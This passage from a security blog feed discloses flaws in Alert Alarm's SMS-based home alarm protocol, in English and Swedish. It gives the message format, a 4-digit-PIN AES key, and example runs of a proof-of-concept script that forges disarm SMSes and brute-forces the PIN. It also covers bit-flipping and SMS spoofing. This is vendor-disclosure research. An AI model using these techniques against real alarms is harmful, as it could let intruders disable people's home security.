&lt;li&gt;&lt;strong&gt;November 4th 2019&lt;/strong&gt;: I reach out once again asking for an update.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;November 7th 2019&lt;/strong&gt;: Verisure replies with more or less the same message as
October 2nd. Again promises to get back to me soon.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="line-block"&gt;
&lt;div class="line"&gt;&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="page-updates"&gt;
&lt;h2&gt;Page updates&lt;/h2&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;strong&gt;1:st January 2020&lt;/strong&gt;: I'm cleaning up the write-up and publish all this. The
reason for doing it today is because today it's half a year ago since I
initially reported the issues to Alert Alarm. If they would have been serious
about this, it should all have been fixed by now and they should have
reconnected better with me.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;3:rd January 2020&lt;/strong&gt;: Updating the article with clarification regarding Alert
Alarm's vs Verisure's role in this.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;5:th January 2020&lt;/strong&gt;: Updating the article with additional information
regarding the SMS attack and a new section about questions that have been
asked on forums etc.&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="line-block"&gt;
&lt;div class="line"&gt;&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="summary"&gt;
&lt;h2&gt;Summary&lt;/h2&gt;
&lt;p&gt;The security of the solution relies on&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;the pin code and&lt;/li&gt;
&lt;li&gt;the SMS senders phone number and&lt;/li&gt;
&lt;li&gt;that no-one is able to get hold of the SMS sent.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;In fact, one can argue that &lt;strong&gt;the security only relies on &amp;quot;3&amp;quot;&lt;/strong&gt;, since if one
gets hold of &amp;quot;3&amp;quot;, then it's trivial to figure out &amp;quot;1&amp;quot;, that is basically what
the script &lt;a class="reference external" href="https://github.com/Jyx/alert_alarm_xploit/blob/master/aaxploit.py"&gt;aaxploit.py&lt;/a&gt; does. &amp;quot;2&amp;quot; on the other hand is typically available
in phone books etc, i.e., it's usually not hard to figure out the phone numbers
to the owner of a house.&lt;/p&gt;
&lt;p&gt;Alert Alarm seems to have tried to &amp;quot;lock&amp;quot; the SMS service to a set of users.
i.e., the first user have to add additional phone numbers before these people
can use the app. So at first glance, one might believe that it's only the
owners of these phone numbers who can send the SMS. But the fact is that there
are many services out there that allow you to send &lt;a class="reference external" href="https://www.google.com/search?q=send+spoofed+sms&amp;amp;oq=send+spoofed+sms"&gt;spoofed SMS&lt;/a&gt; so it looks
like they were sent from a certain phone number. I.e., it's totally possible to
craft a SMS using &lt;a class="reference external" href="https://github.com/Jyx/alert_alarm_xploit/blob/master/aaxploit.py"&gt;aaxploit.py&lt;/a&gt; and then use one of these services to send a
rouge SMS. I.e., any user can turn off the alarm without the alarm owner knowing
about it.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Should the owners of this alarm be worried?&lt;/strong&gt; Getting an SMS from the home
owner is probably a bit challenging, so it's probably a bit hard to actually do
the attack (don't leave your phone unattended!). On the other hand if Alert
Alarm &lt;strong&gt;doesn't&lt;/strong&gt; notice brute force attacks on the receiving side of the SMS,
then it's fairly easy to put this attack into practice.&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;strong&gt;Added 2020-01-05&lt;/strong&gt;: Since other Alert Alarm users have helped confirming
that it's not a single and common SMS number that receives the alarm SMSes,
the brute force attack where one needs to send multiple SMSes isn't
practically doable, since it'd require too many SMSes to be sent out. So my
conclusion is that Alert Alarm owners doesn't have to worry about that
particular attack, it's simply too complicated to put the attack in practice.
However, it should not be mixed with the brute force attack on the SMS to get
the pin code. That still works as described. I.e., a man in the middle can
figure out a home owners code to turn on/off the alarm. What we would like to
see is that the protocol is designed in such a way that the man in middle gets
&lt;strong&gt;no&lt;/strong&gt; useful information out for the data sent between the phone and the
receiver of the data/SMS.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;No matter, the flaws identified are quite severe and gives an attacker several
ways to attack the system. Attacks that shouldn't be possible to do that easy on
a system meant to protect our homes. Me and the other customers of Alert Alarm
don't want our burglar alarms to have these kind of weaknesses. Right now it's
more &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Security_through_obscurity"&gt;Security by Obscurity&lt;/a&gt; than real security.&lt;/p&gt;
&lt;div class="line-block"&gt;
&lt;div class="line"&gt;&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="about-me"&gt;
&lt;h2&gt;About me&lt;/h2&gt;
&lt;p&gt;I'm Joakim Bech, a guy who has been working with Security on embedded devices
for the last 12 years. I did the work above on my spare time, but otherwise I
head the security team at a company called &lt;a class="reference external" href="https://www.linaro.org/"&gt;Linaro&lt;/a&gt; where I've been working for
a little bit more than 6 years.&lt;/p&gt;
&lt;/div&gt;
</content><category term="Hacking"></category></entry><entry><title>Alert Alarm SMS exploit - Svensk version</title><link href="https://jyx.github.io/alert-alarm-exploit-se.html" rel="alternate"></link><published>2020-01-02T12:01:00+01:00</published><updated>2020-01-05T15:01:00+01:00</updated><author><name>Joakim Bech</name></author><id>tag:jyx.github.io,2020-01-02:/alert-alarm-exploit-se.html</id><summary type="html">&lt;p&gt;For English translation of the article please go &lt;a class="reference external" href="alert-alarm-exploit.html"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;FÃ¶r mindre teknikintresserade personer eller fÃ¶r er som inte bryr sig mycket
om detaljerna rÃ¤cker det fÃ¶rmodligen att lÃ¤sa denna introduktion och sektionen
&lt;a class="reference internal" href="#sammanfatting"&gt;Sammanfatting&lt;/a&gt; sist i artikeln fÃ¶r att fÃ¥ ett hum om vad det rÃ¶r sig om.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p class="first"&gt;Testat idag 2020-01-01 sÃ¥ Ã¤r det som presenteras hÃ¤r fortfarande ej Ã¥tgÃ¤rdat,
dvs bristerna som nÃ¤mns hÃ¤r finns fortfarande i Alert Alarms system trots att
det rapporterades till dem den 3:e Juli â€¦&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;For English translation of the article please go &lt;a class="reference external" href="alert-alarm-exploit.html"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;FÃ¶r mindre teknikintresserade personer eller fÃ¶r er som inte bryr sig mycket
om detaljerna rÃ¤cker det fÃ¶rmodligen att lÃ¤sa denna introduktion och sektionen
&lt;a class="reference internal" href="#sammanfatting"&gt;Sammanfatting&lt;/a&gt; sist i artikeln fÃ¶r att fÃ¥ ett hum om vad det rÃ¶r sig om.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p class="first"&gt;Testat idag 2020-01-01 sÃ¥ Ã¤r det som presenteras hÃ¤r fortfarande ej Ã¥tgÃ¤rdat,
dvs bristerna som nÃ¤mns hÃ¤r finns fortfarande i Alert Alarms system trots att
det rapporterades till dem den 3:e Juli 2019.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;&lt;a class="reference external" href="https://www.alertalarm.se"&gt;Alert Alarm&lt;/a&gt; Ã¤r ett svenskt fÃ¶retag som sÃ¤ljer inbrottslarm till
privatpersoner och villaÃ¤gare. PÃ¥ en av deras sidor kan man lÃ¤sa [&lt;a class="reference external" href="https://www.alertalarm.se/hemlarm/garanti-och-funktion.html#1"&gt;1&lt;/a&gt;] att:
&amp;quot;vÃ¥ra hemlarm kommunicerar krypterat Ã¶ver GSM i fÃ¶rsta hand och med SMS i
andra hand&amp;quot;. UtÃ¶ver det verkar det som att det finns en koppling mellan Alert
Alarm och &lt;a class="reference external" href="https://www.verisure.se/"&gt;Verisure&lt;/a&gt; eftersom de personer jag varit i kontakt med efter
fÃ¶rsta rapportering kommer frÃ¥n Verisure.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p class="first"&gt;&lt;strong&gt;Tillagt 2020-01-03&lt;/strong&gt;: Ett fÃ¶rtydligande gÃ¤llande Verisure's roll i det
hela eftersom vissa personer dels misstolkat informationen hÃ¤r, dels har
personer som jobbar pÃ¥ Verisure sagt att de tvÃ¥ larm-lÃ¶sningarna, dvs Alert
Alarms och Verisures, inte har nÃ¥got gemensamt. Notera dock ett dessa
uttalande &lt;strong&gt;inte&lt;/strong&gt; kommer direkt ifrÃ¥n Verisure utan frÃ¥n personer pÃ¥ forum
sÃ¥ sÃ¤ger sig jobba hos Verisure.&lt;/p&gt;
&lt;p&gt;Vad har dÃ¥ detta att gÃ¶ra med Verisure i Ã¶vrigt? Alert Alarm Ã¤r ett
dotterbolag till Verisure (se &lt;a class="reference external" href="https://www.merinfo.se/foretag/Alert-Alarm-AB-5566748975/2k2aqzz-hp1t/styrelse-koncern"&gt;merinfo.se&lt;/a&gt;). Efter att jag hade rapporterat
detta i somras har jag &lt;strong&gt;enbart&lt;/strong&gt; varit i kontakt med Verisure (personer
vars email slutar pÃ¥ &amp;#64;verisure.com). Om det Ã¤r Verisure anstÃ¤llda eller
Alert Alarm anstÃ¤llda som jobbat med att fÃ¶rsÃ¶ka lÃ¶sa
svagheterna/sÃ¤kerhetshÃ¥len det vet jag inte, likasÃ¥ vet jag inget om
skillnader eller likheter mellan deras lÃ¶sningar. Men det jag vet Ã¤r att jag
enbart varit i kontakt med folk frÃ¥n Verisure.&lt;/p&gt;
&lt;p&gt;Men fÃ¶r att repetera och gÃ¶ra det extra tydligt, &lt;strong&gt;denna rapport rÃ¶r
endast Alert Alarms larmlÃ¶sning och rÃ¶r inte Verisures larmlÃ¶sning&lt;/strong&gt;. Om
(och nÃ¤r?) Alert Alarm och/eller Verisure vill gÃ¶ra tillÃ¤gg, bekrÃ¤ftelser
eller fÃ¶rtydligande, sÃ¥ kommer jag att uppdatera denna artikel. Mitt mÃ¥l Ã¤r
att ge fakta och inte fÃ¶rvrÃ¤nga eller ge felaktiga uppgifter. Med andra ord
vÃ¤nligen hÃ¶r av er om ni finner att det som stÃ¥r i denna artikel inte
stÃ¤mmer eller Ã¤r missvisande, sÃ¥ kommer jag att Ã¥tgÃ¤rda det med era
referenser och kommentarer. Ingen ifrÃ¥n vare sig Alert Alarm eller Verisure
har till dags datum dementerat det som stÃ¥r hÃ¤r och denna artikel Ã¤r i
princip densamma som skickades till dem i Juli 2019.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Allt bÃ¶rjade med att jag en morgon i Juni 2019 mÃ¤rkte att nÃ¤r man larmar av
frÃ¥n Alert Alarms app sÃ¥ genereras ett SMS med en (hex-)strÃ¤ng, dvs en 64
tecken lÃ¥ng strÃ¤ng med siffror och bokstÃ¤ver. Efter att jag gjort lite
&amp;quot;reverse engineering&amp;quot; av appen sÃ¥ hittade jag ett flertal sÃ¤kerhetssvagheter
relaterat till deras sÃ¤tt att larma pÃ¥/av systemet frÃ¥n deras Android app.
Dessa svagheter kan summeras i:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;Krypteringen bestÃ¥r av ren AES-CBC som Ã¤r &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Malleability_(cryptography)"&gt;malleable&lt;/a&gt; (hittar ingen bra
svensk Ã¶versÃ¤ttning), vilket innebÃ¤r att man kan Ã¤ndra den krypterade texten
och det slÃ¥r i sin tur pÃ¥ den dekrypterade texten.&lt;/li&gt;
&lt;li&gt;Inget integritetsskydd pÃ¥ skickade krypterade meddelanden (SMS'en).&lt;/li&gt;
&lt;li&gt;Kraftigt reducerad nyckelrymd, frÃ¥n 128-bitar till att enbart anvÃ¤nda 9999
nycklar.&lt;/li&gt;
&lt;li&gt;AnvÃ¤nder inga enhetsunika egenskaper/vÃ¤rden tillsammans med data som skickas
till Alert Alarm servern.&lt;/li&gt;
&lt;li&gt;Det anvÃ¤nds ingen KDF (Key Derivation Function), vilket fÃ¶rmodligen hade
varit Ã¶nskvÃ¤rt i ett sÃ¥nt hÃ¤r scenario.&lt;/li&gt;
&lt;li&gt;Det anvÃ¤nds inget nyckelutbytesprotokoll (likt Diffie Hellman t.ex.) fÃ¶r att
komma Ã¶verens om en unik krypteringsnyckel.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;Sammantaget gÃ¶r detta att Alert Alarms system Ã¤r ganska sÃ¥rbart. Allt som
krÃ¤vs frÃ¥n en illvillig person Ã¤r att fÃ¥ tag pÃ¥ ett endaste krypterat
meddelande fÃ¶r att enkelt lista ut koden fÃ¶r att larma av ett hus. Antingen
kan man skicka ett manuellt skapat och fejkat &amp;quot;larma av SMS&amp;quot; (Google &lt;a class="reference external" href="https://www.google.com/search?q=send+spoofed+sms&amp;amp;oq=send+spoofed+sms"&gt;spoofed
SMS&lt;/a&gt;) som ser ut att komma frÃ¥n anvÃ¤ndaren. Eller kan en inbrottstjuv bryta
upp dÃ¶rren och slÃ¥ in koden under tiden som larmet rÃ¤knar ner, dvs slÃ¥ in
koden precis som Ã¤garen till larmet skulle gjort.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p class="first"&gt;PÃ¥ resten av denna sida finns exempel och skript som kan dekryptera Alert
Alarm SMS, skapa giltiga Alert Alarm SMS, hitta den korrekta koden fÃ¶r att
larma av/pÃ¥ genom att gÃ¶ra en s.k. &amp;quot;bruteforce&amp;quot; attack. En sÃ¥dan attack tar
mindre Ã¤n en sekund att utfÃ¶ra pÃ¥ Alert Alarms system. Det Ã¤r Ã¤ven mÃ¶jligt att
vÃ¤nda pÃ¥ bitar sÃ¥ att ett meddelande fÃ¥r en annan betydelse Ã¤n vad var menat
till att bÃ¶rja med.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="line-block"&gt;
&lt;div class="line"&gt;&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="observation"&gt;
&lt;h2&gt;Observation&lt;/h2&gt;
&lt;p&gt;Som redan nÃ¤mnt, detta fÃ¥ngade min uppmÃ¤rksamhet nÃ¤r jag stÃ¤ngde av mitt hemlarm
via Alert Alarms Android app. Det skapades ett SMS enligt bilden nedan (jag har
suddat ut en del av meddelandet, annars kan vem som helst luska ut koden till
vÃ¥rt hemlarm).&lt;/p&gt;
&lt;div class="align-center figure"&gt;
&lt;img alt="SMS image" src="/images/alert/aa_initial_sms.png" /&gt;
&lt;/div&gt;
&lt;p&gt;Efter att ha spenderat resten av morgonen med att &amp;quot;reverse engineera&amp;quot; SMS delen
i Alert Alarm appen kom jag fram till att den 64 byte lÃ¥nga hexstrÃ¤ngen bestÃ¥r
av tvÃ¥ delar. Den fÃ¶rsta delen Ã¤r &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Initialization_vector"&gt;IV&lt;/a&gt;'t som Ã¤r en slumpmÃ¤ssig hexstrÃ¤ng (skapas
av &lt;tt class="docutils literal"&gt;SHA1PRNG&lt;/tt&gt;) och den andra delen Ã¤r det faktiska meddelandet.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;   32 bytes   32 bytes
+-----------+----------+
| IV        | Message  |
+-----------+----------+
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Krypteringsalgoritmen som anvÃ¤nds Ã¤r &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_Block_Chaining_(CBC)"&gt;AES-CBC&lt;/a&gt; med en 128-bitars nyckel. Dock
skall noteras att nyckeln Ã¤r konstruerad sÃ¥ hÃ¤r:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;000000000000xxxx
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;DÃ¤r Ã¤r &amp;quot;xxxx&amp;quot; koden som anvÃ¤nds fÃ¶r att larma av/pÃ¥ hemlarmet. Med detta innebÃ¤r
det ocksÃ¥ att man kraftigt reducerat antalet mÃ¶jliga nycklar frÃ¥n 128-bitar till
att endast anvÃ¤nda 9999 nycklar. Dvs istÃ¤llet fÃ¶r att anvÃ¤nda
340282366920938463463374607431768211455 nycklar vilket Ã¤r det antal nycklar man
har att vÃ¤lja mellan om man anvÃ¤nt en ordentlig 128-bitars nyckel! Det Ã¤r detta
som gÃ¶r att bruteforce attacken bara tar en sekund att utfÃ¶ra.&lt;/p&gt;
&lt;div class="line-block"&gt;
&lt;div class="line"&gt;&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="meddelandeformat"&gt;
&lt;h3&gt;Meddelandeformat&lt;/h3&gt;
&lt;p&gt;Formatet pÃ¥ de dekrypterade SMS'en Ã¤r som fÃ¶ljer:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Bytes:            1   1   1      2       1     2        2        2         2          2   = 16 bytes
        +-----------+---+---+------+---------+-----+------+--------+---------+----------+
        |SMS Version| i | j | year | month-1 | day | hour | minute | user id | \x00\x00 |
        +-----------+---+---+------+---------+-----+------+--------+---------+----------+
                                      (hex)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;HÃ¤r verkar det som att &lt;tt class="docutils literal"&gt;i&lt;/tt&gt; motsvarar &lt;cite&gt;0=larma av&lt;/cite&gt; och &lt;cite&gt;1=larma pÃ¥&lt;/cite&gt;,
ytterligare verkar det som att &lt;tt class="docutils literal"&gt;j&lt;/tt&gt; indikerar om det Ã¤r hemma- eller
bortatillkopplat larm som gÃ¤ller.&lt;/p&gt;
&lt;div class="line-block"&gt;
&lt;div class="line"&gt;&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="skript"&gt;
&lt;h2&gt;Skript&lt;/h2&gt;
&lt;p&gt;PÃ¥ min GitHub sida hittar ni ett Python skript (&lt;a class="reference external" href="https://github.com/Jyx/alert_alarm_xploit/blob/master/aaxploit.py"&gt;aaxploit.py&lt;/a&gt;) som jag skrev
som ett &amp;quot;proof of concept&amp;quot; skript fÃ¶r att demonstrera sÃ¥rbarheterna i Alert
Alarms system. Med detta skript kan man skapa giltiga Alert Alarm SMS, kÃ¶ra en
bruteforce attack pÃ¥ krypterade Alert Alarm SMS fÃ¶r att fÃ¥ tag pÃ¥ koden som
anvÃ¤nds fÃ¶r att larma av/pÃ¥ hemlarmet. Det finns ytterligare saker man kan gÃ¶ra
vilket jag kommer att beskriva mer i detalj hÃ¤r nedan. Om man anropar skriptet
utan argument sÃ¥ fÃ¥r man se alla mÃ¶jliga parametrar, men fÃ¶r att gÃ¶ra det lite
enklare att fÃ¶lja med sÃ¥ har jag satt samman ett par exempel nedan.&lt;/p&gt;
&lt;div class="line-block"&gt;
&lt;div class="line"&gt;&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="skapa-ett-giltigt-alert-alarm-sms"&gt;
&lt;h3&gt;Skapa ett giltigt Alert Alarm SMS&lt;/h3&gt;
&lt;p&gt;Detta skapar ett korrekt och giltigt Alert Alarm SMS (dvs. en hexstrÃ¤ng) som kan
skickas som ett vanligt SMS (eller via ett fejkat SMS, se &lt;a class="reference external" href="https://www.google.com/search?q=send+spoofed+sms&amp;amp;oq=send+spoofed+sms"&gt;spoofed SMS&lt;/a&gt;). Dvs
hÃ¤r kan vi skapa ett SMS fÃ¶r att larma pÃ¥/av systemet. &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;-p&lt;/span&gt;&lt;/tt&gt; Ã¤r parametern fÃ¶r
larmkoden du vill anvÃ¤nda. Ã„ger du ett Alert Alarm system, sÃ¥ kan du prÃ¶va detta
med din egen larmkod. Du kan prÃ¶va med antigen &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;--on&lt;/span&gt;&lt;/tt&gt; eller &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;--off&lt;/span&gt;&lt;/tt&gt; fÃ¶r att
larma pÃ¥ eller larma av larmet. Detta SMS kan du sen skicka till enheten som Ã¤r
tilltÃ¤nkt att attackeras.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Tillagt 2020-01-05&lt;/strong&gt;: Efter att ha fÃ¥tt feedback frÃ¥n andra Alert Alarm
anvÃ¤ndare kan vi dra slutsatsen SMS ej gÃ¥r till ett centralt nummer utan
istÃ¤llet gÃ¥r de till larmenheten direkt.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./aaxploit.py -e -p &lt;span class="m"&gt;1234&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Msg:              &lt;span class="m"&gt;32303131393630333038343830310000&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: IV:               d244e98aed6f2dfbf991485e5e43cd56
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Key:              &lt;span class="m"&gt;30303030303030303030303031323334&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0000000000001234&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Mode: encryption
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Crafted SMS:      d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="line-block"&gt;
&lt;div class="line"&gt;&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="dekryptera-ett-alert-alarm-sms"&gt;
&lt;span id="decrypt-sms"&gt;&lt;/span&gt;&lt;h3&gt;Dekryptera ett Alert Alarm SMS&lt;/h3&gt;
&lt;p&gt;Om du tar ett Alert Alarm SMS (64-byte hexstrÃ¤ng), sÃ¥ kan du dekryptera det
genom att mata in larmkoden som nyckel via &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;-p&lt;/span&gt;&lt;/tt&gt; parametern, &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;-d&lt;/span&gt;&lt;/tt&gt; indikerar
dekryptering och &lt;tt class="docutils literal"&gt;&lt;span class="pre"&gt;--input&lt;/span&gt; &amp;lt;sms&amp;gt;&lt;/tt&gt; Ã¤r sjÃ¤lv SMS'et. HÃ¤r kÃ¤nner vi redan till
larmkoden, sÃ¥ detta i sig Ã¤r inget sÃ¤kerhetshÃ¥l, men det visar att vi kan
dekryptera meddelande som en vanlig anvÃ¤ndare inte borde kÃ¤nna till hur man gÃ¶r.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./aaxploit.py --input d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b -d -p &lt;span class="m"&gt;1234&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Original SMS:     d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Msg:              ee184c8e49d04a468eabd14aee04079b
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: IV:               d244e98aed6f2dfbf991485e5e43cd56
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Key:              &lt;span class="m"&gt;30303030303030303030303031323334&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0000000000001234&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Mode: decryption
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: &lt;span class="p"&gt;|&lt;/span&gt; sms_v &lt;span class="p"&gt;|&lt;/span&gt; i &lt;span class="p"&gt;|&lt;/span&gt; j &lt;span class="p"&gt;|&lt;/span&gt; year &lt;span class="p"&gt;|&lt;/span&gt; month &lt;span class="p"&gt;|&lt;/span&gt; day &lt;span class="p"&gt;|&lt;/span&gt; hour &lt;span class="p"&gt;|&lt;/span&gt; minute &lt;span class="p"&gt;|&lt;/span&gt; user_id &lt;span class="p"&gt;|&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;:       &lt;span class="m"&gt;2&lt;/span&gt;   &lt;span class="m"&gt;0&lt;/span&gt;   &lt;span class="m"&gt;1&lt;/span&gt;     &lt;span class="m"&gt;19&lt;/span&gt;     0x6    &lt;span class="m"&gt;03&lt;/span&gt;     &lt;span class="m"&gt;08&lt;/span&gt;       &lt;span class="m"&gt;48&lt;/span&gt;        &lt;span class="m"&gt;01&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="line-block"&gt;
&lt;div class="line"&gt;&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="bruteforce-attack-pa-ett-krypterat-sms"&gt;
&lt;h3&gt;Bruteforce attack pÃ¥ ett krypterat SMS&lt;/h3&gt;
&lt;p&gt;HÃ¤r utgÃ¥r vi frÃ¥n att vi &lt;strong&gt;inte&lt;/strong&gt; kÃ¤nner till korrekt nyckel (larmkod) fÃ¶r att
dekryptera ett SMS, men pÃ¥ nÃ¥got sÃ¤tt har vi kommit Ã¶ver ett krypterat Alert
Alarm SMS. Genom att gÃ¶ra en bruteforce attack kan vi hitta korrekt
krypteringsnyckel och dÃ¤rmed ocksÃ¥ larmkoden som anvÃ¤nds fÃ¶r att larma av/pÃ¥
hemlarmet. PÃ¥ grund av en vÃ¤ldigt svag och dÃ¥ligt vald nyckel, sÃ¥ verkar det som
att denna bruteforce attack alltid fungerar. Korrekt nyckel/larmkod hittas under
mindre Ã¤n en sekund.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./aaxploit.py --input d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b -b
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Original SMS:     d244e98aed6f2dfbf991485e5e43cd56ee184c8e49d04a468eabd14aee04079b
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Msg:              ee184c8e49d04a468eabd14aee04079b
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: IV:               d244e98aed6f2dfbf991485e5e43cd56
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Key:              None &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;0000000000000000&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: Mode: bruteforce
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;: &lt;span class="o"&gt;(&lt;/span&gt;Probably&lt;span class="o"&gt;)&lt;/span&gt; found the correct ...
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;:    encryption key: &lt;span class="m"&gt;30303030303030303030303031323334&lt;/span&gt;
&lt;span class="o"&gt;[&lt;/span&gt;INFO&lt;span class="o"&gt;]&lt;/span&gt;:    pin:            &lt;span class="m"&gt;1234&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Som vi kan se, sÃ¥ har vi hittat korrekt nyckel/larmkod! Notera att detta Ã¤r
samma kod som anvÃ¤nds fÃ¶r att larma av/pÃ¥ hemlarmet! Dvs om en inbrottstjuv
bryter sig in sÃ¥ kan denna person slÃ¥ denna kod precis som Ã¤garen till huset
skulle gjort.&lt;/p&gt;
&lt;div class="line-block"&gt;
&lt;div class="line"&gt;&lt;br /&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="andra-bitar-i-krypterade-meddelanden"&gt;
&lt;span id="flip-bits"&gt;&lt;/span&gt;&lt;h3&gt;Ã„ndra bitar i krypterade meddelanden&lt;/h3&gt;
&lt;p&gt;Eftersom AES-CBC Ã¤r &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Malleability_(cryptography)"&gt;malleable&lt;/a&gt;, sÃ¥ innebÃ¤r det att man kan Ã¤ndra avsikten med
ursprungliga meddelandet genom att bara Ã¤ndra bitar i IV't. Dvs, man kan Ã¤ndra
ett &amp;quot;larma pÃ¥&amp;quot; SMS till att bli ett &amp;quot;larma av&amp;quot; SMS genom att Ã¤ndra vÃ¤l valda
bitar. VÃ¤rt att notera Ã¤r att detta gÃ¶rs direkt pÃ¥ det krypterade meddelandet.
Dvs, man behÃ¶ver &lt;strong&gt;inte&lt;/strong&gt; dekryptera meddelandet fÃ¶r gÃ¶ra denna attack. I
